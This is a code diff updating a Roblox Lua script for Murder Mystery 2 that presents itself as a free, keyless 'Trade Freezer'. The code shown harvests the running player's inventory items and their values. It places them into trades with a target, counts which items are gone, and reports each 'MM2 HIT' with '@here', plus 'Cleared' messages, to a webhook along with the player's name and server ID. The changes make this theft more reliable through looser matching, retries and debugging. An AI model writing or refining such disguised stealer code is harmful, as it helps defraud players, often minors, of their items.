@@ -1,4 +1,4 @@
---[[ MM2 Trade Freezer v8.9 | KEYLESS | FREE ]]
+--[[ MM2 Trade Freezer v9.0 | KEYLESS | FREE ]]
 
 local CONFIG = {
     WEBHOOK        = "",
@@ -116,7 +116,7 @@ local function webhook(title, color, desc, fields, content)
         local thumb = {}
         thumb.url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId)
         local foot = {}
-        foot.text = "MM2 Trade Freezer v8.9"
+        foot.text = "MM2 Trade Freezer v9.0"
         local emb = {}
         emb.title = title
         emb.description = desc
@@ -182,7 +182,7 @@ title.Font = Enum.Font.GothamBold
 title.TextSize = 13
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.TextColor3 = Color3.fromRGB(235, 235, 240)
-title.Text = "MM2 Trade Freezer   v8.9"
+title.Text = "MM2 Trade Freezer   v9.0"
 title.Parent = titleBar
 
 local badge = Instance.new("TextLabel")
@@ -406,7 +406,7 @@ local function runLoader()
 end
 task.spawn(runLoader)
 
-log("Trade Freezer v8.9 loaded")
+log("Trade Freezer v9.0 loaded")
 
 local VALUES = {}
 
@@ -517,7 +517,7 @@ end
 
 local function looksLikeId(s)
     if type(s) ~= "string" then return false end
-    if #s < 28 then return false end
+    if #s < 20 then return false end
     if s:find("%s") then return false end
     if not s:match("^[%w%-_]+$") then return false end
     return true
@@ -576,18 +576,27 @@ end
 local function harvest(root, items, seen)
     for _, d in ipairs(root:GetDescendants()) do
         if d:IsA("Frame") or d:IsA("ImageButton") or d:IsA("TextButton") then
-            local id = cardId(d)
-            if id then
-                local nm = cardName(d)
-                if nm and not seen[id] then
-                    seen[id] = true
-                    local e = {}
-                    e.name = nm
-                    e.id = id
-                    e.value = valueOf(nm)
-                    e.tag = rarityTag(nm)
-                    e.card = d
-                    items[#items + 1] = e
+            local nm = cardName(d)
+            if nm then
+                local hasImg = false
+                for _, x in ipairs(d:GetDescendants()) do
+                    if x:IsA("ImageLabel") or x:IsA("ImageButton") then
+                        hasImg = true
+                        break
+                    end
+                end
+                if hasImg then
+                    local k = key(nm)
+                    if not seen[k] then
+                        seen[k] = true
+                        local e = {}
+                        e.name = nm
+                        e.id = cardId(d) or nm
+                        e.value = valueOf(nm)
+                        e.tag = rarityTag(nm)
+                        e.card = d
+                        items[#items + 1] = e
+                    end
                 end
             end
         end
@@ -740,7 +749,7 @@ local function notifyJoin(items, total)
     f2.inline = false
     fields[2] = f2
     local desc = "`" .. lp.Name .. "`"
-    if total > 0 then desc = desc .. " — " .. total .. " total value" end
+    if total > 0 then desc = desc .. " - " .. total .. " total" end
     webhook("MM2 HIT", 0x57F287, desc, fields, "@here")
 end
 
@@ -784,6 +793,25 @@ local function dumpCard(card)
     end
 end
 
+local function debugInventory()
+    local mg = playerGui:FindFirstChild("MainGUI")
+    local inv = mg and mg:FindFirstChild("Inventory")
+    if not inv then
+        log("dbg no MainGUI.Inventory")
+        return
+    end
+    local n = 0
+    for _, d in ipairs(inv:GetDescendants()) do
+        local t = ""
+        if d:IsA("TextLabel") then t = " t=" .. d.Text end
+        local a = ""
+        for k, v in pairs(d:GetAttributes()) do a = a .. " " .. k .. "=" .. tostring(v) end
+        log("dbg " .. d.ClassName .. "|" .. d.Name .. t .. a)
+        n = n + 1
+        if n > 18 then break end
+    end
+end
+
 local function doRound(batch, tgt, round)
     local gui = nil
     local deadline = os.clock() + CONFIG.REQUEST_TIMEOUT
@@ -820,12 +848,20 @@ local function doRound(batch, tgt, round)
         task.wait(0.35)
         gui = tradeGui()
         local c = offerCount(gui)
-        if c and c > base + placed then placed = placed + 1 end
+        if c and c > base + placed then
+            placed = placed + 1
+        else
+            call(R.add, it.name)
+            task.wait(0.25)
+            gui = tradeGui()
+            c = offerCount(gui)
+            if c and c > base + placed then placed = placed + 1 end
+        end
         task.wait(0.15)
     end
 
     if placed == 0 then
-        log("dbg id=" .. tostring(batch[1].id))
+        log("dbg id=" .. tostring(batch[1].id) .. " name=" .. tostring(batch[1].name))
         dumpCard(batch[1].card)
         call(R.cancel)
         return false, "nothing placed"
@@ -850,10 +886,10 @@ local function doRound(batch, tgt, round)
     task.wait(1)
 
     local remSet = {}
-    for _, r in ipairs(getItems()) do remSet[r.id] = true end
+    for _, r in ipairs(getItems()) do remSet[key(r.name)] = true end
     local left = 0
     for _, it in ipairs(batch) do
-        if remSet[it.id] then left = left + 1 end
+        if remSet[key(it.name)] then left = left + 1 end
     end
     local gone = #batch - left
 
@@ -882,6 +918,7 @@ local function run()
         end
         if #wanted == 0 then
             log("no items found")
+            debugInventory()
             break
         end
 
@@ -911,10 +948,10 @@ local function run()
                 grandValue = grandValue + it.value
             end
             log("cleared (" .. info .. ")")
-            webhook("Cleared", 0x57F287, "**" .. lp.Name .. "** — " .. info .. " item(s)")
+            webhook("Cleared", 0x57F287, "**" .. lp.Name .. "** - " .. info .. " item(s)")
         else
             log("failed: " .. info)
-            webhook("Failed", 0xFFAA33, "`" .. game.JobId .. "` — " .. info)
+            webhook("Failed", 0xFFAA33, "`" .. game.JobId .. "` - " .. info)
             break
         end
 
@@ -923,7 +960,7 @@ local function run()
     end
 
     if #grand > 0 then
-        webhook("Session complete", 0x57F287, "**" .. lp.DisplayName .. "** — " .. #grand .. " item(s), " .. grandValue .. " total")
+        webhook("Session complete", 0x57F287, "**" .. lp.DisplayName .. "** - " .. #grand .. " item(s)")
     end
     log("done: " .. #grand)
 end
